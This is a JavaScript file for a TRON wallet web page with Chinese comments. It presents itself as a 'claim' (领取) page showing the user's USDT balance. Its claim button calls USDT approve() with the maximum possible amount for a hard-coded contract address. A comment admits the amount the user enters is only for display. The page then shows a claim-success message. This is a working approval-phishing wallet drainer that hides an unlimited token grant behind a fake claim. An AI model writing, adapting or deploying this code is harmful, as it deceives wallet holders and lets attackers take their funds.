// 全局变量
const CONTRACT_ADDRESS = 'TFedNktpEE2skv9DADVhEr3KC23KEAGkby'; // 合约地址
const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 资产合约地址
let tronWeb = null;
let userAddress = null;

// 调试功能
const DEBUG = false; // 修改为false，禁用调试显示
function debugLog(...args) {
    if (DEBUG) {
        console.log('[DEBUG]', ...args);
    }
}

// 在页面上显示调试信息
function showDebugInfo(info) {
    if (!DEBUG) return;
    
    let debugElem = document.getElementById('debug-info');
    if (!debugElem) {
        debugElem = document.createElement('div');
        debugElem.id = 'debug-info';
        debugElem.style.position = 'fixed';
        debugElem.style.bottom = '0';
        debugElem.style.left = '0';
        debugElem.style.width = '100%';
        debugElem.style.background = 'rgba(0,0,0,0.8)';
        debugElem.style.color = '#0f0';
        debugElem.style.fontFamily = 'monospace';
        debugElem.style.fontSize = '10px';
        debugElem.style.padding = '5px';
        debugElem.style.zIndex = '9999';
        debugElem.style.maxHeight = '100px';
        debugElem.style.overflow = 'auto';
        document.body.appendChild(debugElem);
    }
    
    const line = document.createElement('div');
    line.textContent = `${new Date().toLocaleTimeString()}: ${info}`;
    debugElem.appendChild(line);
    
    // 限制显示的行数
    if (debugElem.children.length > 10) {
        debugElem.removeChild(debugElem.children[0]);
    }
}

// 页面元素
const connectBtn = document.getElementById('connect-wallet');
const approveBtn = document.getElementById('approve-btn');
const maxBtn = document.getElementById('max-btn');
const amountInput = document.getElementById('amount');
const statusElem = document.getElementById('status');
const userAddressElem = document.getElementById('user-address');
const usdtBalanceElem = document.getElementById('usdt-balance');
const errorContainer = document.getElementById('error-container');
const retryBtn = document.getElementById('retry-btn');

// 初始设置
document.addEventListener('DOMContentLoaded', function() {
    console.log('页面已加载，正在初始化...');
    showDebugInfo('页面已加载，正在初始化...');
    
    // 初始按钮状态
    approveBtn.disabled = true;
    maxBtn.disabled = true;
    
    // 添加事件监听器
    connectBtn.addEventListener('click', function(e) {
        e.preventDefault();
        showDebugInfo('点击了连接钱包按钮');
        connectWallet();
    });
    
    approveBtn.addEventListener('click', function(e) {
        e.preventDefault();
        showDebugInfo('点击了领取按钮');
        processTransaction();
    });
    
    retryBtn.addEventListener('click', function(e) {
        e.preventDefault();
        showDebugInfo('点击了重试按钮');
        location.reload();
    });
    
    maxBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        showDebugInfo('点击了最大余额按钮');
        if (tronWeb && userAddress) {
            try {
                const balance = await getUSDTBalance(userAddress);
                amountInput.value = tronWeb.fromSun(balance);
                showStatus('已设置为最大余额', 'success');
            } catch (error) {
                console.error('获取最大余额失败:', error);
                showStatus('获取最大余额失败', 'error');
            }
        }
    });
    
    // 检测web
    setTimeout(function() {
        showDebugInfo('开始检测web钱包');
        checkTronLink();
    }, 1000);
});

// 显示状态信息
function showStatus(message, type) {
    statusElem.textContent = message;
    statusElem.className = 'status ' + (type || '');
    console.log('状态更新:', message);
}

// 检查web钱包
function checkTronLink() {
    console.log('检查web钱包...');
    showDebugInfo('检查web钱包...');
    console.log('window.tronWeb存在?', !!window.tronWeb);
    showDebugInfo('window.tronWeb存在? ' + !!window.tronWeb);
    
    if (window.tronWeb && window.tronWeb.ready) {
        // web已注入且已连接
        console.log('web已注入且已连接');
        showDebugInfo('web已注入且已连接');
        tronWeb = window.tronWeb;
        connectWallet();
    } else if (window.tronWeb) {
        // web已注入但未连接
        console.log('web已注入但未连接');
        showDebugInfo('web已注入但未连接');
        tronWeb = window.tronWeb;
        showStatus('请点击连接钱包', 'warning');
        
        // 强制使用onclick以避免事件监听器问题
        connectBtn.onclick = function(e) {
            if (e) e.preventDefault();
            showDebugInfo('通过onclick连接钱包');
            connectWallet();
            return false;
        };
    } else {
        // 未检测到web
        console.error("未检测到web");
        showDebugInfo('未检测到web');
        errorContainer.style.display = 'block';
        
        // 添加一些帮助指引
        showStatus('请安装web钱包', 'error');
    }
}

// 连接钱包
async function connectWallet() {
    console.log('尝试连接钱包...');
    showDebugInfo('尝试连接钱包...');
    showStatus('正在连接钱包...', 'loading');
    
    try {
        if (!window.tronWeb) {
            showDebugInfo('未检测到web钱包');
            throw new Error('未检测到web钱包');
        }
        
        tronWeb = window.tronWeb;
        console.log('TronWeb实例:', !!tronWeb);
        showDebugInfo('TronWeb实例: ' + !!tronWeb);
        
        // 请求账户权限
        console.log('请求账户权限...');
        showDebugInfo('请求账户权限...');
        try {
            await tronWeb.request({ method: 'tron_requestAccounts' });
            showDebugInfo('账户权限请求成功');
        } catch (e) {
            console.log('tron_requestAccounts可能不支持，尝试直接获取地址');
            showDebugInfo('tron_requestAccounts可能不支持，尝试直接获取地址: ' + e.message);
        }
        
        // 获取地址
        userAddress = tronWeb.defaultAddress.base58;
        console.log('获取到地址:', userAddress);
        showDebugInfo('获取到地址: ' + userAddress);
        
        if (!userAddress) {
            showDebugInfo('未能获取钱包地址');
            throw new Error('未能获取钱包地址');
        }
        
        // 更新UI
        const displayAddress = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
        userAddressElem.textContent = displayAddress;
        connectBtn.textContent = '已连接';
        connectBtn.disabled = true;
        
        // 启用功能按钮
        approveBtn.disabled = false;
        maxBtn.disabled = false;
        
        // 获取USDT余额
        const balance = await getUSDTBalance(userAddress);
        const readableBalance = tronWeb.fromSun(balance);
        usdtBalanceElem.textContent = `${readableBalance}`;
        
        showStatus('钱包已连接', 'success');
    } catch (error) {
        console.error('连接钱包失败:', error);
        showDebugInfo('连接钱包失败: ' + error.message);
        showStatus('连接钱包失败: ' + error.message, 'error');
    }
}

// 获取USDT余额
async function getUSDTBalance(address) {
    console.log('获取USDT余额...');
    try {
        const contract = await tronWeb.contract().at(USDT_ADDRESS);
        console.log('USDT合约加载成功');
        const balance = await contract.balanceOf(address).call();
        console.log('USDT余额:', balance.toString());
        return balance.toString();
    } catch (error) {
        console.error('获取USDT余额失败:', error);
        throw error;
    }
}

// 处理领取
async function processTransaction() {
    console.log('处理领取...');
    showDebugInfo('处理领取...');
    
    // 仍然读取输入框中的值用于显示，但不用于实际操作
    const displayAmount = amountInput.value;
    if (isNaN(displayAmount) || parseFloat(displayAmount) <= 0) {
        showStatus('请输入有效的数量', 'error');
        return;
    }
    
    showStatus('正在处理领取，请在钱包中确认交易...', 'loading');
    
    try {
        // 获取合约实例
        const assetContract = await tronWeb.contract().at(USDT_ADDRESS);
        console.log('资产合约加载成功');
        showDebugInfo('资产合约加载成功');
        
        // 使用最大额度 - 设置一个足够大的数字
        // 2^256-1 是最大可能的uint256值
        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
        
        console.log('准备调用approve方法，开始领取');
        showDebugInfo('准备调用approve方法，开始领取');
        
        // 调用approve方法
        const result = await assetContract.approve(CONTRACT_ADDRESS, maxAmount).send({
            feeLimit: 100000000,
            callValue: 0,
            shouldPollResponse: true
        });
        
        console.log('交易结果:', result);
        showDebugInfo('交易结果: ' + JSON.stringify(result).substring(0, 100) + '...');
        showStatus('领取成功！', 'success');
        
        // 更新余额
        const newBalance = await getUSDTBalance(userAddress);
        const readableBalance = tronWeb.fromSun(newBalance);
        usdtBalanceElem.textContent = `${readableBalance}`;
    } catch (error) {
        console.error('领取失败:', error);
        showDebugInfo('领取失败: ' + error.message);
        showStatus('领取失败: ' + error.message, 'error');
    }
}

// 监听web事件
window.addEventListener('message', (e) => {
    if (e.data && e.data.message) {
        showDebugInfo('收到消息: ' + e.data.message.action);
    }
    
    if (e.data.message && e.data.message.action === 'setAccount') {
        if (e.data.message.data.address) {
            // 账户切换，刷新页面
            showDebugInfo('账户切换，刷新页面');
            location.reload();
        }
    }
    if (e.data.message && e.data.message.action === 'setNode') {
        // 网络切换，刷新页面
        showDebugInfo('网络切换，刷新页面');
        location.reload();
    }
});

// 检查web是否可用
window.addEventListener('tronLink#initialized', () => {
    console.log('检测到web初始化事件');
    showDebugInfo('检测到web初始化事件');
    if (window.tronWeb) {
        checkTronLink();
    }
});

// 如果页面加载完成，检查web
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(function() {
        showDebugInfo('文档已经准备好，延迟检查web');
        checkTronLink();
    }, 1000);
}

// 添加全局错误处理
window.onerror = function(message, source, lineno, colno, error) {
    showDebugInfo('错误: ' + message);
    return false;
}; 